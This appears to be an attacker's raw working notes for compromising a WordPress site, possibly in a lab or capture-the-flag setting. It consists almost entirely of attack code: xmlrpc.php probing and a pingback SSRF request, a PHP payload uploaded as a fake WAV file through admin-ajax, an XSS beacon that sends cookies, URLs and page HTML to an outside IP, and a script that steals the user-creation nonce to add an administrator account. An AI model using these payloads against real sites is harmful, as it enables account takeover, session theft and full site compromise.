1. wordpress module enumerate
2. wordpress https://infosecwriteups.com/mastering-wordpress-penetration-testing-a-step-by-step-guide-d99a06487486

curl 'https://starofus.xyz/xmlrpc.php' \
  -k \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0' \
  -H 'Connection: close' \
  -H 'Cookie: wordpress_test_cookie=WP%20Cookie%20check' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Content-Type: text/xml; charset=UTF-8' \
  -X POST \
  -d '<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' 


curl 'https://starofus.xyz/xmlrpc.php' \
  -k \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0' \
  -H 'Connection: close' \
  -H 'Cookie: wordpress_test_cookie=WP%20Cookie%20check' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Content-Type: text/xml; charset=UTF-8' \
  -X POST \
  -d '<methodCall><methodName>wp.getProfile</methodName></methodCall>'


curl 'https://starofus.xyz/xmlrpc.php' \
  -k \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0' \
  -H 'Connection: close' \
  -H 'Cookie: wordpress_test_cookie=WP%20Cookie%20check' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Content-Type: text/xml; charset=UTF-8' \
  -X POST \
  -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://localhost:8000/index.php</string></value></param></params></methodCall>'

jQuery(document).ready(function ($) {
    const formData = new FormData();
    formData.append('action', 'save_voice_results');
    formData.append('nonce', '7e2d87a9df');
    formData.append('post_id', 96);
    formData.append('encrypted_payload', 'IgB68hcGBIlLlkYVo6E0pUNJiU0lk8tut7ISfipo7IgvERIq8wfBzgcnbDtt3Dzy069HZQwStjdi6MtXZL8Bckdw4w==');
    const response = $.ajax({
        url: 'https://starofus.xyz/wp-admin/admin-ajax.php',
        type: 'POST',
        data: formData,
        processData: false,
        contentType: false
    });
});


// real work
jQuery(document).ready(function ($) {    
  const buffer = new ArrayBuffer(128);
  const view = new DataView(buffer);

  // WAV header
  const writeString = (offset, string) => {
      for (let i = 0; i < string.length; i++) {
          view.setUint8(offset + i, string.charCodeAt(i));
      }
  };

  writeString(0, '<?php echo "hello pwn" ?>');

  const blob = new Blob([buffer], { type: 'text/plain' });
    const formData = new FormData();
    formData.append('action', 'save_voice_raw');
    formData.append('nonce', '49fd9ec88e');
    formData.append('voice_recording', blob, 'testz7.wav');

    const response = $.ajax({
        url: 'https://starofus.xyz/wp-admin/admin-ajax.php',
        type: 'POST',
        data: formData,
        processData: false,
        contentType: false
    });
});


// XSS work
<script src="http://10.10.17.229/tools/aa.js"></script>

new Image().src="http://10.10.17.229:81/index.php?a=" + escape(document.cookie) + "&url=" + escape(document.URL) + "&html=" + escape(document.documentElement.innerHTML)

/index.php?a=wp-settings-time-3%3D1783389208&url=https%3A//starofus.xyz/wp-admin/edit.php%3Fpost_type%3Dcontact_submission&html



dde0dfa054
// get add user 
jQuery(document).ready(function ($) {  
  var res = $.ajax({
      url: 'https://starofus.xyz/wp-admin/user-new.php',
      type: 'POST'
  }).done(function(data){
    var id = $(data).find("#_wpnonce_create-user").val();   
      var res = $.ajax({
        url: 'https://starofus.xyz/wp-admin/user-new.php',
        type: 'POST', 
        data:{
          '_wpnonce_create-user': id,
          '_wp_http_referer': '/wp-admin/user-new.php',
          'action': 'createuser',
          'nonce': '9e39546208',
          'user_login': 'testadd',
          'email': 'testadd@qq.com',
          'first_name': 'aaa',
          'last_name': 'bbb',
          'url': 'bbb',
          'pass1': 'z123456789',
          'pass2': 'z123456789',
          'pw_weak': 'on',
          'role': 'administrator',
          'createuser': 'Add+User'
        },       
    }).done(function(data){
      //new Image().src="http://10.10.17.229:81/index.php?a=" + escape(document.cookie) + "&url=" + escape(document.URL) + "&id=" + escape(id) + "&msg=" + escape(data.message);
    });
  });
});